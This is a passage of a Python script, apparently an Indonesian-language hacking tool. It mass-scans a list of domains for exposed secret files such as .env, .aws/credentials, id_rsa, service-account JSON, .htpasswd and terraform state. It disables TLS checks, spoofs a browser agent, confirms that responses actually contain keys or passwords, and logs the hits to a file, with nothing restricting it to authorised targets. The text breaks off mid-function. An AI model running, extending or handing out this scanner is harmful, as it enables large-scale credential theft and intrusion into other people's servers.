#!/usr/bin/env python3
import os
import sys
import requests
import time
import json
import re
import subprocess
import shutil
import urllib3
import warnings
import threading
import platform
import getpass
from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
from urllib.parse import urlparse, urljoin
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)
warnings.filterwarnings("ignore", category=urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")

try:
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
    pass

os.environ['PYTHONWARNINGS'] = 'ignore'

RED = "\033[38;2;255;0;0m"
GREEN = "\033[38;2;0;255;0m"
YELLOW = "\033[38;2;255;255;0m"
BLUE = "\033[38;2;100;150;255m"   
CYAN = "\033[38;2;0;255;255m"
MAGENTA = "\033[38;2;255;0;255m"
RESET = "\033[0m"
    
def is_html_error_page(content):
    content_lower = content.lower()
    error_patterns = [
        '404 not found', '403 forbidden', '500 internal server',
        'access denied', 'page not found', 'the requested url was not found',
        'you are not authorized', 'forbidden', 'error 404', 'error 403',
        'not found', 'requested page not found', 'document not found',
        '404 error', 'the page you are looking for', 'sorry, the page you are looking',
        'error 500', 'internal server error', '500 error',
        'could not be found', 'does not exist', 'has been removed',
        'no such file', 'directory has no index file'
    ]
    if any(pattern in content_lower for pattern in error_patterns):
        return True
    
    if '<title>' in content_lower:
        title_match = re.search(r'<title>(.*?)</title>', content_lower, re.IGNORECASE | re.DOTALL)
        if title_match:
            title = title_match.group(1).lower()
            if any(err in title for err in ['404', '403', '500', 'not found', 'error', 'forbidden', 'access denied']):
                return True
    
    return False

def is_likely_legitimate_response(content, headers, file_type):
    if not content or len(content) < 20:
        return False
    
    if is_html_error_page(content):
        return False
    
    content_type = headers.get('Content-Type', '').lower()
    
    if 'text/html' in content_type:
        content_lower = content.lower()
        
        if file_type == 'web.config':
            if '<configuration>' not in content_lower:
                return False
        
        if file_type in ['.env', '.env.backup']:
            if '=' not in content:
                return False
        
        if file_type == '.git/config':
            if '[core]' not in content_lower:
                return False
        
        if file_type == '.htaccess':
            htaccess_markers = ['rewriteengine', 'rewriterule', 'allow from', 'deny from']
            if not any(marker in content_lower for marker in htaccess_markers):
                return False
        
        if file_type == '.htpasswd':
            if ':' not in content:
                return False
    
    content_length = headers.get('Content-Length')
    if content_length:
        try:
            if int(content_length) < 50:
                return False
        except:
            pass
    
    return True

def check_response_status(r):
    if r.status_code == 200:
        return True
    
    if r.status_code in [301, 302, 303, 307, 308]:
        redirect_url = r.headers.get('Location', '')
        if '/error' in redirect_url.lower() or '404' in redirect_url:
            return False
        return True
    
    return False

def valid_webconfig(content, headers):
    if not content or len(content) < 50:
        return False
    
    if not is_likely_legitimate_response(content, headers, 'web.config'):
        return False
    
    content_lower = content.lower()
    
    if '<?xml' not in content_lower and '<configuration>' not in content_lower:
        return False
    
    markers = ['<system.webserver>', '<system.web>', '<appsettings>', '<connectionstrings>']
    if any(marker in content_lower for marker in markers):
        return True
    
    return False

def valid_composer(content, headers):
    if not content or len(content) < 50:
        return False
    
    if not is_likely_legitimate_response(content, headers, 'composer.json'):
        return False
    
    try:
        data = json.loads(content)
        if 'require' in data or 'name' in data:
            return True
    except:
        pass
    
    return False

def valid_package(content, headers):
    if not content or len(content) < 50:
        return False
    
    if not is_likely_legitimate_response(content, headers, 'package.json'):
        return False
    
    try:
        data = json.loads(content)
        if 'dependencies' in data or 'devDependencies' in data:
            return True
        if 'name' in data and 'version' in data:
            return True
    except:
        pass
    
    return False

def valid_dsstore(content, headers):

    if not content or len(content) < 100 or len(content) > 500000:
        return False
    
    if not is_likely_legitimate_response(content, headers, '.DS_Store'):
        return False
    
    if 'Bud1' not in content and 'DSDB' not in content:
        return False
    
    patterns = [b'Bud1', b'DSDB', b'clrh', b'icnv', b'info', b'logc', b'lssp', b'dscl', b'iloc']
    pattern_count = sum(1 for p in patterns if p in content.encode('utf-8', errors='ignore'))
    
    if pattern_count < 2:
        return False
    
    return True

def valid_htaccess(content, headers):
    if not content or len(content) < 20:
        return False
    
    if not is_likely_legitimate_response(content, headers, '.htaccess'):
        return False
    
    content_lower = content.lower()
    
    htaccess_keywords = [
        'rewriteengine', 'rewriterule', 'rewritebase', 'rewritecond',
        'order allow,deny', 'order deny,allow', 'deny from', 'allow from',
        'require', 'authname', 'authtype', 'authuserfile', 'authgroupfile',
        'satisfy', 'filesmatch', 'redirect', 'errordocument', 'setenv',
        'setenvif', 'header', 'addtype', 'addhandler', 'options',
        'directoryindex', 'cachecontrol', 'expires'
    ]
    
    keyword_count = sum(1 for k in htaccess_keywords if k in content_lower)
    if keyword_count < 2:
        return False
    
    return True

def valid_htpasswd(content, headers):
    if not content or len(content) < 10:
        return False
    
    if not is_likely_legitimate_response(content, headers, '.htpasswd'):
        return False
    
    lines = content.strip().split('\n')
    valid_lines = 0
    
    for line in lines:
        if ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2 and parts[0].strip() and parts[1].strip():
                if len(parts[1].strip()) >= 5:
                    valid_lines += 1
    
    return valid_lines >= 1

def valid_service_account(content, headers):
    if not content or len(content) < 50:
        return False
    
    if not is_likely_legitimate_response(content, headers, 'service-account.json'):
        return False
    
    try:
        data = json.loads(content)
        if 'client_email' in data or 'private_key' in data or 'project_id' in data:
            return True
    except:
        pass
    
    return False

def valid_env(content, headers):
    if not content or len(content) < 30:
        return False
    
    if not is_likely_legitimate_response(content, headers, '.env'):
        return False
    
    content_lower = content.lower()
    
    if '=' not in content:
        return False
    
    lines = [line.strip() for line in content.split('\n') if line.strip() and not line.strip().startswith('#')]
    env_lines = [line for line in lines if '=' in line and not line.startswith('#')]
    
    if len(env_lines) < 2:
        return False
    
    sensitive_keys = ['db_', 'password', 'secret', 'api_', 'token', 'key', 'database', 
                     'redis', 'mongodb', 'mysql', 'postgres', 'aws_', 'azure_']
    has_sensitive = any(any(key in line.lower() for key in sensitive_keys) for line in env_lines)
    
    if not has_sensitive:
        return False
    
    return True

def valid_phpinfo(content, headers):
    if not content or len(content) < 5000 or len(content) > 500000:
        return False
    
    if not is_likely_legitimate_response(content, headers, 'phpinfo.php'):
        return False
    
    content_lower = content.lower()
    
    if 'phpinfo' not in content_lower and 'php version' not in content_lower:
        return False
    
    if '<style' not in content_lower:
        return False
    
    php_keywords = [
        'php version', 'system', 'server api', 'configuration', 'php.ini',
        'extension_dir', 'disable_functions', 'open_basedir', 'upload_max_filesize',
        'post_max_size', 'max_execution_time', 'memory_limit'
    ]
    
    keyword_count = sum(1 for k in php_keywords if k in content_lower)
    if keyword_count < 3:
        return False
    
    return True

def valid_git(content, headers):
    if not content or len(content) < 30:
        return False
    
    if not is_likely_legitimate_response(content, headers, '.git/config'):
        return False
    
    content_lower = content.lower()
    
    if '[core]' not in content_lower:
        return False
    
    markers = ['repositoryformatversion', 'filemode', 'bare', 'logallrefupdates']
    if any(marker in content_lower for marker in markers):
        return True
    
    return False

def valid_sql_file(content, headers):
    if not content or len(content) < 50:
        return False
    
    if not is_likely_legitimate_response(content, headers, 'database.sql'):
        return False
    
    content_lower = content.lower()
    
    sql_keywords = ['create table', 'insert into', 'select *', 'update', 'delete from', 
                    'drop table', 'alter table', 'create database', 'grant', 'revoke',
                    'foreign key', 'primary key', 'unique key']
    
    if any(k in content_lower for k in sql_keywords):
        return True
    
    return False

def valid_backup_file(content, headers):
    if not content or len(content) < 100:
        return False
    
    if not is_likely_legitimate_response(content, headers, 'backup.zip'):
        return False
    
    content_lower = content.lower()
    
    if 'backup' in content_lower or 'dump' in content_lower:
        return True
    
    return False

def valid_id_rsa(content, headers):
    if not content or len(content) < 100:
        return False
    
    if not is_likely_legitimate_response(content, headers, 'id_rsa'):
        return False
    
    if 'BEGIN OPENSSH PRIVATE KEY' in content or 'BEGIN RSA PRIVATE KEY' in content:
        return True
    
    return False

def valid_pem_cert(content, headers):
    if not content or len(content) < 100:
        return False
    
    if not is_likely_legitimate_response(content, headers, 'cert.pem'):
        return False
    
    if 'BEGIN CERTIFICATE' in content or 'BEGIN PRIVATE KEY' in content:
        return True
    
    return False

def valid_aws_credentials(content, headers):
    if not content or len(content) < 50:
        return False
    
    if not is_likely_legitimate_response(content, headers, '.aws/credentials'):
        return False
    
    content_lower = content.lower()
    
    if 'aws_access_key_id' in content_lower and 'aws_secret_access_key' in content_lower:
        return True
    
    return False

def valid_azure_credentials(content, headers):
    if not content or len(content) < 50:
        return False
    
    if not is_likely_legitimate_response(content, headers, 'azure.json'):
        return False
    
    content_lower = content.lower()
    
    if 'client_id' in content_lower and 'client_secret' in content_lower:
        return True
    if 'tenant_id' in content_lower and 'subscription_id' in content_lower:
        return True
    
    return False

def valid_database_connection(content, headers):
    if not content or len(content) < 50:
        return False
    
    if not is_likely_legitimate_response(content, headers, 'database.yml'):
        return False
    
    content_lower = content.lower()
    
    connection_patterns = [
        'jdbc:', 'mongodb://', 'mysql://', 'postgresql://',
        'redis://', 'elasticsearch', 'database:', 'host:', 'port:',
        'username:', 'password:', 'connection:'
    ]
    
    if any(pattern in content_lower for pattern in connection_patterns):
        return True
    
    return False

def scan_sensitive_files():
    file_domain = input(f"{YELLOW}[+] File domain: {RESET}").strip()
    if not file_domain:
        print(f"{RED}[-] Kosong {RESET}")
        sys.exit(0)
    if not os.path.exists(file_domain):
        print(f"{RED}[?] File {file_domain} gak ada{RESET}")
        sys.exit(0)
    domains = baca_domain(file_domain)
    if not domains:
        print(f"{RED}[-] Domain kosong{RESET}")
        sys.exit(0)
    
    threads = get_threads()
    
    sensitive_files = [
        ('/web.config', valid_webconfig, 'web.config'),
        ('/app.config', valid_webconfig, 'app.config'),
        ('/.env', valid_env, '.env'),
        ('/.env.backup', valid_env, '.env.backup'),
        ('/.git/config', valid_git, '.git/config'),
        ('/.htaccess', valid_htaccess, '.htaccess'),
        ('/.htpasswd', valid_htpasswd, '.htpasswd'),
        ('/package.json', valid_package, 'package.json'),
        ('/composer.json', valid_composer, 'composer.json'),
        ('/service-account.json', valid_service_account, 'service-account.json'),
        ('/database.sql', valid_sql_file, 'database.sql'),
        ('/.DS_Store', valid_dsstore, '.DS_Store'),
        ('/phpinfo.php', valid_phpinfo, 'phpinfo.php'),
        ('/wp-config.php', valid_phpinfo, 'wp-config.php'),
        ('/backup.zip', valid_backup_file, 'backup.zip'),
        ('/error.log', valid_backup_file, 'error.log'),
        ('/id_rsa', valid_id_rsa, 'id_rsa'),
        ('/cert.pem', valid_pem_cert, 'cert.pem'),
        ('/.aws/credentials', valid_aws_credentials, '.aws/credentials'),
        ('/azure.json', valid_azure_credentials, 'azure.json'),
        ('/database.yml', valid_database_connection, 'database.yml'),
        ('/nginx.conf', valid_service_account, 'nginx.conf'),
        ('/my.cnf', valid_service_account, 'my.cnf'),
        ('/redis.conf', valid_service_account, 'redis.conf'),
        ('/Dockerfile', valid_backup_file, 'Dockerfile'),
        ('/docker-compose.yml', valid_backup_file, 'docker-compose.yml'),
        ('/.gitlab-ci.yml', valid_backup_file, '.gitlab-ci.yml'),
        ('/Jenkinsfile', valid_backup_file, 'Jenkinsfile'),
        ('/terraform.tfstate', valid_backup_file, 'terraform.tfstate'),
        ('/config.json', valid_service_account, 'config.json'),
        ('/secret.txt', valid_service_account, 'secret.txt'),
        ('/token.txt', valid_service_account, 'token.txt'),
        # TAMBAHAN
        ('/.hg', valid_hg, '.hg'),
        ('/.npmrpc', valid_npmrpc, '.npmrpc'),
        ('/.next', valid_next, '.next'),
        ('/.nuxt', valid_nuxt, '.nuxt'),
        ('/.npmrc', valid_npmrc, '.npmrc'),
        ('/.Thumbs.db', valid_thumbs_db, '.Thumbs.db'),
        ('/gcloud.json', valid_gcloud, 'gcloud.json'),
    ]
    
    total_domains = len(domains)
    
    print(f"{GREEN}[+] Scanning Sensitive Files dengan HTML parser...{RESET}")
    print(f"{GREEN}[+] Total domains: {total_domains}, threads: {threads}{RESET}")
    print(f"{YELLOW}[+] Total file patterns: {len(sensitive_files)}{RESET}")
    
    found = []
    found_lock = threading.Lock()
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for domain in domains:
            futures.append(executor.submit(scan_sensitive_from_html, domain, sensitive_files))
        
        for i, future in enumerate(as_completed(futures), 1):
            result = scan_with_spinner(f"Scanning sensitive files", future, total_domains)
            if result:
                with found_lock:
                    for url in result:
                        print(f"{GREEN}[+] {i}/{total_domains} {url}{RESET}")
                        found.append(url)
                    with open("sensitive_files.txt", "a") as f:
                        for url in result:
                            f.write(f"{url}\n")
    
    if found:
        print(f"\n{GREEN}[+] Found {len(found)} sensitive files{RESET}")
        print(f"{YELLOW}[+] Saved: sensitive_files.txt{RESET}")
    else:
        print(f"{RED}[-] Gak ada sensitive files{RESET}")
    
    print(f"\n{YELLOW}[!] Scan selesai!{RESET}")
    sys.exit(0)

def scan_sensitive_from_html(domain, sensitive_files):
    results = []
    visited = set()
    session = requests.Session()
    session.verify = False
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    # ========== AMBIL BASE CONTENT UNTUK DETEKSI CUSTOM ERROR PAGE ==========
    base_content = None
    base_title = None
    base_keywords = []
    base_length = 0
    try:
        base_resp = session.get(f"https://{domain}/", timeout=10, allow_redirects=True)
        if base_resp.status_code == 200:
            base_content = base_resp.text
            base_length = len(base_content)
            base_keywords = re.findall(r'\b[a-z]{4,}\b', base_content.lower())
            title_match = re.search(r'<title>(.*?)</title>', base_content, re.IGNORECASE)
            if title_match:
                base_title = title_match.group(1).strip().lower()
    except:
        pass
    
    # ========== SKIP EXTENSI ==========
    skip_extensions = ['.css', '.js', '.jpg', '.jpeg', '.png', '.gif', '.svg', '.ico', 
                      '.woff', '.woff2', '.ttf', '.eot', '.mp4', '.mp3', '.pdf', 
                      '.doc', '.docx', '.xls', '.xlsx']
    
    try:
        for path, validator, file_type in sensitive_files:
            url = f"https://{domain}{path}"
            try:
                # ========== CEK DULU DENGAN allow_redirects=False ==========
                r = session.get(url, timeout=5, allow_redirects=False)
                
                # ========== CEK APAKAH REDIRECT KE HOME ==========
                if r.status_code in [301, 302, 303, 307, 308]:
                    redirect_url = r.headers.get('Location', '')
                    # Jika redirect ke home atau root, skip
                    if redirect_url in ['/', f'https://{domain}/', f'http://{domain}/', f'https://{domain}', f'http://{domain}']:
                        continue
                    # Jika redirect ke halaman error, skip
                    if any(x in redirect_url.lower() for x in ['error', '404', '403', '500', 'notfound']):
                        continue
                    # Coba follow redirect
                    try:
                        r2 = session.get(url, timeout=5, allow_redirects=True)
                        if r2.status_code == 200:
                            content = r2.text
                            # Cek custom error page
                            if is_custom_error_page(content, base_content, base_title, base_keywords, base_length):
                                continue
                            if is_html_error_page(content):
                                continue
                            if len(content) < 50:
                                continue
                            if not validate_sensitive_content(content, r2.headers, file_type, r2.content):
                                continue
                            result_text = f"{url} [{file_type}]"
                            if result_text not in results:
                                results.append(result_text)
                                visited.add(url)
                    except:
                        pass
                    continue
                
                # ========== LANJUTKAN SEBAGAI BIASA ==========
                if r.status_code != 200:
                    continue
                
                content = r.text
                
                # CEK CUSTOM ERROR PAGE
                if is_custom_error_page(content, base_content, base_title, base_keywords, base_length):
                    continue
                
                if is_html_error_page(content):
                    continue
                
                if '<meta http-equiv="refresh"' in content.lower():
                    continue
                
                if 'Index of /' in content or 'Parent Directory' in content:
                    continue
                
                if len(content) < 50:
                    continue
                
                if not validate_sensitive_content(content, r.headers, file_type, r.content):
                    continue
                
                result_text = f"{url} [{file_type}]"
                if result_text not in results:
                    results.append(result_text)
                    visited.add(url)
            except:
                pass
        
        # ========== PARSE HTML UNTUK CARI LINK ==========
        try:
            response = session.get(f"https://{domain}/", timeout=10, allow_redirects=True)
            if response.status_code == 200:
                content = response.text
                current_url = response.url
                
                soup = BeautifulSoup(content, 'html.parser')
                links = set()
                
                for tag in ['a', 'link']:
                    for element in soup.find_all(tag):
                        if element.get('href'):
                            link = element['href']
                            if link and not link.startswith(('mailto:', 'tel:', 'javascript:', '#')):
                                if not any(link.lower().endswith(ext) for ext in skip_extensions):
                                    links.add(link)
                
                for tag, attr in [('script', 'src'), ('img', 'src'), ('iframe', 'src'), ('source', 'src')]:
                    for element in soup.find_all(tag):
                        if element.get(attr):
                            link = element[attr]
                            if link and not link.startswith(('mailto:', 'tel:', 'javascript:', '#')):
                                if not any(link.lower().endswith(ext) for ext in skip_extensions):
                                    links.add(link)
                
                parsed_domain = urlparse(f"https://{domain}")
                domain_netloc = parsed_domain.netloc
                
                for link in links:
                    if link in visited:
                        continue
                    
                    if link.startswith('//'):
                        full_url = f"https:{link}"
                    elif link.startswith('/'):
                        full_url = f"https://{domain}{link}"
                    elif link.startswith('http://') or link.startswith('https://'):
                        full_url = link
                    else:
                        full_url = urljoin(current_url, link)
                    
                    parsed_url = urlparse(full_url)
                    if parsed_url.netloc and parsed_url.netloc != domain_netloc:
                        continue
                    
                    for path, validator, file_type in sensitive_files:
                        file_name = os.path.basename(path)
                        
                        if file_name.lower() in full_url.lower():
                            try:
                                # ========== CEK DENGAN allow_redirects=False ==========
                                r = session.get(full_url, timeout=5, allow_redirects=False)
                                
                                if r.status_code in [301, 302, 303, 307, 308]:
                                    redirect_url = r.headers.get('Location', '')
                                    if redirect_url in ['/', f'https://{domain}/', f'http://{domain}/', f'https://{domain}', f'http://{domain}']:
                                        continue
                                    if any(x in redirect_url.lower() for x in ['error', '404', '403', '500', 'notfound']):
                                        continue
                                    try:
                                        r2 = session.get(full_url, timeout=5, allow_redirects=True)
                                        if r2.status_code == 200:
                                            if is_custom_error_page(r2.text, base_content, base_title, base_keywords, base_length):
                                                continue
                                            if is_html_error_page(r2.text):
                                                continue
                                            if len(r2.text) < 50:
                                                continue
                                            if not validate_sensitive_content(r2.text, r2.headers, file_type, r2.content):
                                                continue
                                            result_text = f"{full_url} [{file_type}]"
                                            if result_text not in results:
                                                results.append(result_text)
                                                visited.add(full_url)
                                            break
                                    except:
                                        pass
                                    continue
                                
                                if r.status_code != 200:
                                    continue
                                
                                if is_custom_error_page(r.text, base_content, base_title, base_keywords, base_length):
                                    continue
                                
                                if is_html_error_page(r.text):
                                    continue
                                
                                if len(r.text) < 50:
                                    continue
                                
                                if not validate_sensitive_content(r.text, r.headers, file_type, r.content):
                                    continue
                                
                                result_text = f"{full_url} [{file_type}]"
                                if result_text not in results:
                                    results.append(result_text)
                                    visited.add(full_url)
                                break
                            except:
                                pass
        except:
            pass
        
        return results
        
    except Exception as e:
        return results

def is_custom_error_page(content, base_content, base_title, base_keywords, base_length):
    """Deteksi custom error page dengan membandingkan konten dengan halaman base"""
    if not content or not base_content:
        return False
    
    content_lower = content.lower()
    
    # ===== CEK 1: TITLE SAMA =====
    title1 = re.search(r'<title>(.*?)</title>', content, re.IGNORECASE)
    if title1 and base_title:
        if title1.group(1).strip().lower() == base_title:
            return True
    
    # ===== CEK 2: KONTEN SAMA PERSIS =====
    if content == base_content:
        return True
    
    # ===== CEK 3: SIMILARITY 90% =====
    if len(content) > 100 and len(base_content) > 100:
        sample_size = min(1000, len(content), len(base_content))
        if content[:sample_size] == base_content[:sample_size]:
            return True
    
    # ===== CEK 4: KEYWORD SIMILARITY =====
    if base_keywords:
        content_keywords = set(re.findall(r'\b[a-z]{4,}\b', content_lower))
        base_keywords_set = set(base_keywords)
        if len(content_keywords) > 0 and len(base_keywords_set) > 0:
            overlap = len(content_keywords & base_keywords_set)
            ratio = overlap / len(base_keywords_set)
            if ratio > 0.7:  # 70% keyword sama
                return True
    
    # ===== CEK 5: PANJANG KONTEN SAMA =====
    if base_length > 0:
        if abs(len(content) - base_length) < 50:
            return True
    
    return False

def validate_sensitive_content(content, headers, file_type, binary_content=None):
    """Validasi konten dengan ULTRA KETAT - MULTI LAYER VALIDATION"""
    
    # ========== LAYER 1: HEADER VALIDATION ==========
    content_type = headers.get('Content-Type', '').lower()
    content_length = headers.get('Content-Length')
    
    # Cek content-length
    if content_length:
        try:
            length = int(content_length)
            if file_type in ['.env', '.env.backup', '.htaccess', '.htpasswd', '.npmrc']:
                if length < 30 or length > 50000:
                    return False
            elif file_type in ['package.json', 'composer.json', 'service-account.json', 'gcloud.json']:
                if length < 50 or length > 500000:
                    return False
            elif file_type in ['web.config', 'app.config']:
                if length < 100 or length > 500000:
                    return False
            elif file_type in ['backup.zip', 'error.log']:
                if length < 100 or length > 5000000:
                    return False
            elif file_type in ['id_rsa', 'cert.pem']:
                if length < 200 or length > 50000:
                    return False
            else:
                if length < 50:
                    return False
        except:
            pass
    
    # ========== LAYER 2: CONTENT TYPE VALIDATION ==========
    # Jika HTML, harus punya konten yang valid
    if 'text/html' in content_type:
        # Cek halaman error
        if is_html_error_page(content):
            return False
        
        # Cek redirect
        if '<meta http-equiv="refresh"' in content.lower():
            return False
        
        # Cek title
        title_match = re.search(r'<title>(.*?)</title>', content, re.IGNORECASE | re.DOTALL)
        if title_match:
            title = title_match.group(1).lower().strip()
            
            # Blacklist title
            blacklist_titles = [
                '404', '403', '500', 'not found', 'error', 'forbidden', 
                'access denied', 'page not found', 'index of', 'directory listing',
                'home', 'welcome', 'default', 'under construction', 'maintenance',
                'coming soon', 'site down', 'server error', 'internal server error',
                'bad request', 'unauthorized', 'service unavailable', 'gateway timeout'
            ]
            if any(b in title for b in blacklist_titles):
                return False
            
            # Whitelist title untuk file tertentu
            if file_type == 'phpinfo.php':
                if 'phpinfo' not in title and 'php version' not in title:
                    return False
    
    # ========== LAYER 3: CONTENT PATTERN VALIDATION ==========
    content_lower = content.lower()
    
    # Validasi spesifik per tipe file dengan pattern matching
    validators = {
        '.env': lambda c: (
            '=' in c and 
            len([l for l in c.split('\n') if l.strip() and not l.startswith('#') and '=' in l]) >= 3 and
            any(k in c.upper() for k in ['DB_', 'PASSWORD', 'SECRET', 'API_', 'TOKEN', 'KEY', 'AWS_', 'AZURE_', 'REDIS_', 'MYSQL_', 'POSTGRES_'])
        ),
        '.env.backup': lambda c: (
            '=' in c and 
            len([l for l in c.split('\n') if l.strip() and not l.startswith('#') and '=' in l]) >= 3 and
            any(k in c.upper() for k in ['DB_', 'PASSWORD', 'SECRET', 'API_', 'TOKEN', 'KEY'])
        ),
        '.git/config': lambda c: (
            '[core]' in c and 
            'repositoryformatversion' in c and
            ('filemode' in c or 'bare' in c)
        ),
        'web.config': lambda c: (
            '<configuration>' in c and 
            '<?xml' in c and
            ('<system.web' in c or '<system.webserver' in c or '<appsettings' in c)
        ),
        'app.config': lambda c: (
            '<configuration>' in c and 
            '<?xml' in c and
            ('<connectionstrings' in c or '<appsettings' in c)
        ),
        '.htaccess': lambda c: (
            sum(1 for k in ['rewriteengine', 'rewriterule', 'allow from', 'deny from', 'order', 'require'] if k in c) >= 2
        ),
        '.htpasswd': lambda c: (
            len([l for l in c.split('\n') if l.strip() and ':' in l and len(l.split(':', 1)[1].strip()) >= 5]) >= 2
        ),
        'package.json': lambda c: (
            valid_json(c) and 
            '"dependencies"' in c and 
            '"name"' in c and 
            '"version"' in c
        ),
        'composer.json': lambda c: (
            valid_json(c) and 
            ('"require"' in c or '"name"' in c)
        ),
        'phpinfo.php': lambda c: (
            'phpinfo' in c and 
            'php version' in c and
            '<style' in c and
            'extension_dir' in c
        ),
        'service-account.json': lambda c: (
            valid_json(c) and 
            '"client_email"' in c and 
            '"private_key"' in c and
            '"project_id"' in c and
            '"type": "service_account"' in c
        ),
        'gcloud.json': lambda c: (
            valid_json(c) and 
            '"client_email"' in c and 
            '"private_key"' in c and
            '"project_id"' in c
        ),
        'config.json': lambda c: (
            valid_json(c) and 
            (('"host"' in c or '"port"' in c) or ('"database"' in c or '"username"' in c))
        ),
        '.DS_Store': lambda c: True,
        'database.sql': lambda c: (
            sum(1 for k in ['create table', 'insert into', 'select', 'drop table', 'alter table', 'primary key'] if k in c) >= 3
        ),
        'backup.zip': lambda c: len(c) > 1000,
        'error.log': lambda c: (
            len(c) > 100 and
            ('error' in c or 'warning' in c or 'fatal' in c) and
            any(ts in c for ts in ['202', 'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'])
        ),
        'id_rsa': lambda c: (
            'BEGIN OPENSSH PRIVATE KEY' in c or 
            'BEGIN RSA PRIVATE KEY' in c
        ),
        'cert.pem': lambda c: (
            'BEGIN CERTIFICATE' in c or 
            'BEGIN PRIVATE KEY' in c
        ),
        '.aws/credentials': lambda c: (
            'aws_access_key_id' in c and 
            'aws_secret_access_key' in c and
            ('AKIA' in c or 'ASIA' in c) and
            len(c) > 50
        ),
        'azure.json': lambda c: (
            valid_json(c) and 
            ('"client_id"' in c or '"tenant_id"' in c) and
            ('"client_secret"' in c or '"subscription_id"' in c)
        ),
        'database.yml': lambda c: (
            any(p in c for p in ['jdbc:', 'mongodb://', 'mysql://', 'postgresql://', 'redis://', 'database:', 'host:', 'port:']) and
            ('username:' in c or 'password:' in c)
        ),
        'nginx.conf': lambda c: (
            'server {' in c and 
            ('listen' in c or 'server_name' in c) and
            ('location' in c or 'root' in c)
        ),
        'my.cnf': lambda c: (
            ('[client]' in c or '[mysql]' in c or '[mysqld]' in c) and
            ('host' in c or 'port' in c or 'user' in c or 'password' in c)
        ),
        'redis.conf': lambda c: (
            'port' in c and 
            ('daemonize' in c or 'bind' in c) and
            ('requirepass' in c or 'maxmemory' in c)
        ),
        'Dockerfile': lambda c: (
            'FROM' in c and 
            ('RUN' in c or 'COPY' in c or 'ADD' in c) and
            ('CMD' in c or 'ENTRYPOINT' in c or 'WORKDIR' in c)
        ),
        'docker-compose.yml': lambda c: (
            'version:' in c and 
            'services:' in c and
            ('image:' in c or 'build:' in c)
        ),
        '.gitlab-ci.yml': lambda c: (
            ('stages:' in c or 'script:' in c) and
            ('image:' in c or 'variables:' in c)
        ),
        'Jenkinsfile': lambda c: (
            'pipeline' in c and 
            ('agent' in c or 'stages' in c) and
            ('steps' in c or 'script' in c)
        ),
        'terraform.tfstate': lambda c: (
            valid_json(c) and 
            ('"version"' in c or '"terraform_version"' in c) and
            ('"resources"' in c or '"modules"' in c)
        ),
        'secret.txt': lambda c: (
            len(c) > 20 and
            any(sec in c for sec in ['secret', 'password', 'key', 'token', 'apikey', 'auth']) and
            ('=' in c or ':' in c)
        ),
        'token.txt': lambda c: (
            len(c) > 20 and
            any(tok in c for tok in ['token', 'jwt', 'bearer', 'api_key', 'access_token'])
        ),
        '.hg': lambda c: (
            '[paths]' in c or '[web]' in c or '[extensions]' in c
        ),
        '.npmrpc': lambda c: (
            valid_json(c) and 
            ('"npm"' in c or '"registry"' in c)
        ),
        '.next': lambda c: (
            len(c) > 50 and
            ('next' in c or 'build' in c or 'static/chunks' in c)
        ),
        '.nuxt': lambda c: (
            len(c) > 50 and
            ('nuxt' in c or 'build' in c or 'components' in c)
        ),
        '.npmrc': lambda c: (
            len([l for l in c.split('\n') if l.strip() and not l.startswith('#') and '=' in l]) >= 2 and
            ('registry=' in c or '_auth=' in c or '//registry.npmjs.org/:_authToken=' in c)
        ),
        '.Thumbs.db': lambda c: True,
    }
    
    # ========== LAYER 4: JSON VALIDATION ==========
    def valid_json(c):
        try:
            json.loads(c)
            return True
        except:
            return False
    
    # ========== LAYER 5: BINARY VALIDATION ==========
    if file_type == '.DS_Store' and binary_content:
        patterns = [b'Bud1', b'DSDB', b'clrh', b'icnv', b'info', b'logc', b'lssp']
        if sum(1 for p in patterns if p in binary_content[:2000]) < 2:
            return False
        if len(binary_content) < 100 or len(binary_content) > 500000:
            return False
    
    if file_type == '.Thumbs.db' and binary_content:
        if b'\x00\x00\x00\x00' not in binary_content[:50]:
            return False
        if len(binary_content) < 100 or len(binary_content) > 5000000:
            return False
    
    # ========== LAYER 6: RUN VALIDATOR ==========
    if file_type in validators:
        try:
            if not validators[file_type](content_lower if 'json' not in file_type else content):
                return False
        except:
            return False
    
    # ========== LAYER 7: MINIMUM LENGTH ==========
    if len(content) < 30:
        return False
    
    return True

# ========== FUNGSI VALIDASI UNTUK TAMBAHAN ==========

def valid_hg(content, headers):
    return validate_sensitive_content(content, headers, '.hg', None)

def valid_npmrpc(content, headers):
    return validate_sensitive_content(content, headers, '.npmrpc', None)

def valid_next(content, headers):
    return validate_sensitive_content(content, headers, '.next', None)

def valid_nuxt(content, headers):
    return validate_sensitive_content(content, headers, '.nuxt', None)

def valid_npmrc(content, headers):
    return validate_sensitive_content(content, headers, '.npmrc', None)

def valid_thumbs_db(content, headers):
    return validate_sensitive_content(content, headers, '.Thumbs.db', content.encode('utf-8', errors='ignore'))

def valid_gcloud(content, headers):
    return validate_sensitive_content(content, headers, 'gcloud.json', None)

def clean_domain(url):
    url = url.strip()
    if not url:
        return ""
    if url.startswith('http://'):
        url = url[7:]
    elif url.startswith('https://'):
        url = url[8:]
    if url.startswith('www.'):
        url = url[4:]
    url = url.split('/')[0]
    return url

def baca_domain(file_domain):
    domains = []
    try:
        with open(file_domain, "r") as f:
            for line in f:
                line = line.strip()
                if line:
                    d = clean_domain(line)
                    if d:
                        domains.append(d)
    except:
        pass
    return domains

def extract_all_links(content, domain):
    links = []
    patterns = [
        r'href=["\']([^"\']+)["\']',
        r'src=["\']([^"\']+)["\']',
        r'action=["\']([^"\']+)["\']',
        r'data-url=["\']([^"\']+)["\']',
        r'data-href=["\']([^"\']+)["\']',
        r'<a[^>]*href=["\']?([^"\'>\s]+)["\']?',
        r'<form[^>]*action=["\']?([^"\'>\s]+)["\']?',
        r'<link[^>]*href=["\']([^"\']+)["\']',
